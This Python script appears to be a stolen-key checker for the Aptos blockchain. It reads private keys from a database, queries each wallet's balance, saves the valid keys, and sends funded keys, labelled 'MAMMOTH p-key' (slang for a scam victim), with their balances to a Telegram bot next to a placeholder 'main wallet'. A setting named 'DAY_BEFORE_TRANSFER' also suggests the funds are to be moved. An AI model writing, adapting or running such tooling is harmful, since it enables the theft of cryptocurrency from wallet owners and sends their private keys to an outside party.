import asyncio
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from aptos_sdk.account import Account
from aptos_sdk.client import RestClient
from tqdm import tqdm
import sqlite3
import time
import aiohttp
from aiohttp import ClientConnectorError


NODE_URL = "you_node_url_here"
REST_CLIENT = RestClient(NODE_URL)

DATABASE_NAME = 'addresses.db'
VALID_FILE = "valid.txt"
RECHECK_INTERVAL_H = 1
TELEGRAM_TOKEN = "you_tg_token_here"
CHAT_ID = "you_chat_id_here"
WEI_TO_APT = 10**8
BATCH = 20
DAY_BEFORE_TRANSFER = 7


def delete_old_addresses(full_database_name='full_addresses.db'):
    days_ago = time.time() - (DAY_BEFORE_TRANSFER * 24 * 60 * 60)

    # Connect to first database for 'addresses'
    with sqlite3.connect(DATABASE_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT address, timestamp FROM addresses")

        old_addresses = []
        for row in cursor.fetchall():
            dt = datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S.%f')
            epoch = time.mktime(dt.timetuple())
            if epoch < days_ago:
                old_addresses.append((row[0], epoch))

        if not old_addresses:
            return

    # Connect to second database for 'full_addresses'
    with sqlite3.connect(full_database_name) as full_conn:
        full_cursor = full_conn.cursor()
        for address, _ in tqdm(old_addresses, desc="Moving old addresses", unit=" addresses"):
            full_cursor.execute("SELECT 1 FROM full_addresses WHERE address=?", (address,))
            if not full_cursor.fetchone():
                full_cursor.execute("INSERT INTO full_addresses (address) VALUES (?)", (address,))

            # Delete from the first database
            cursor.execute("DELETE FROM addresses WHERE address=?", (address,))

        full_conn.commit()
        conn.commit()


async def send_telegram_message(session, message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        async with session.post(url, json=data) as response:
            if response.status != 200:
                print(f"Failed to send message to Telegram. Status: {response.status}")
    except ClientConnectorError as e:
        print(f"Connection error when sending message to Telegram: {e}")
    except Exception as e:
        print(f"Failed to send message to Telegram due to: {e}")


def setup_database():
    """Set up the SQLite database."""
    with sqlite3.connect(DATABASE_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS addresses (
            address TEXT PRIMARY KEY,
            timestamp DATETIME
        );
        """)
        conn.commit()


async def get_balance(private_key, retries=10):
    with ThreadPoolExecutor() as executor:
        loop = asyncio.get_running_loop()
        current_account = await loop.run_in_executor(executor, Account.load_key, private_key)

        for _ in range(retries):
            try:
                balance = await loop.run_in_executor(executor, REST_CLIENT.account_balance, current_account.address())
                return private_key, balance
            except Exception as e:
                if "0x1::coin::CoinStore<0x1::aptos_coin::AptosCoin>" in str(e):
                    return private_key, None
                elif _ < retries - 1:  # if not the last retry
                    await asyncio.sleep(0.1)  # wait for 2 seconds before retrying
                else:
                    return private_key, 'error'


def store_valid_address_to_txt(address):
    """Append valid address to the txt file."""
    with open(VALID_FILE, "a") as valid_file:
        valid_file.write(address + "\n")

def read_valid_keys_from_file():
    """Read valid keys from the txt file."""
    try:
        with open(VALID_FILE, "r") as valid_file:
            return set(line.strip() for line in valid_file.readlines())
    except FileNotFoundError:
        return set()
def delete_address_from_db(private_key):
    """Delete address (private key) from the database."""
    with sqlite3.connect(DATABASE_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute("DELETE FROM addresses WHERE address=?", (private_key,))
        conn.commit()



def load_addresses_from_db():
    """Load addresses from the database."""
    with sqlite3.connect(DATABASE_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT address FROM addresses")
        return [row[0] for row in cursor.fetchall()]


# Here is the modified version of the `main` function incorporating the suggested changes.

async def main():
    while True:
        delete_old_addresses()
        addresses = load_addresses_from_db()
        existing_valid_keys = read_valid_keys_from_file()

        valid_keys_with_balances = []
        zero_balance_keys_count = 0
        connector = aiohttp.TCPConnector(ssl=False)

        progress_bar = tqdm(
            total=len(addresses),
            desc="Checking keys",
            ncols=169,
            leave=True,
            unit="key",
            unit_scale=True,
            bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}{postfix}]'
        )

        async with aiohttp.ClientSession(connector=connector) as session:
            index = 0
            while index < len(addresses):
                to_process = min(BATCH, len(addresses) - index)
                results = await asyncio.gather(
                    *[get_balance(key) for key in addresses[index:index + to_process]]
                )

                for private_key, balance in results:
                    if private_key in existing_valid_keys:
                        continue

                    if balance == 'error':
                        pass
                    elif balance is not None:
                        store_valid_address_to_txt(private_key)
                        existing_valid_keys.add(private_key)

                        if int(balance) > 0:
                            valid_keys_with_balances.append((private_key, balance))
                        else:
                            zero_balance_keys_count += 1

                progress_bar.update(to_process)
                index += to_process

            if valid_keys_with_balances:
                report_message = "*Good news! :)*\n\n"
                for key, balance in valid_keys_with_balances:
                    report_message += (
                        f"*MAMMOTH p-key:* `{key}`.\n"
                        f"*Its balance:* `{int(balance) / WEI_TO_APT}`\n\n"
                    )
                    delete_address_from_db(key)
            elif zero_balance_keys_count > 0:
                report_message = f"*{zero_balance_keys_count} new wallets were found this time, but all of the balances are zero.*\n\n" \
                                 f"*Good luck next time!*\n\n"
            elif zero_balance_keys_count == 1:
                report_message = f"*{zero_balance_keys_count} new wallet were found this time, it balance are zero.*\n\n" \
                                 f"*Good luck next time!*\n\n"
            else:
                report_message = "*Unfortunately, we didn't find any new valid keys this time :(*\n\n"

            report_message += f"\n*MAIN:* `you_main_wallet_here`"
            await send_telegram_message(session, report_message)

        progress_bar.close()
        await asyncio.sleep(RECHECK_INTERVAL_H * 60 * 60)



if __name__ == "__main__":
    asyncio.run(main())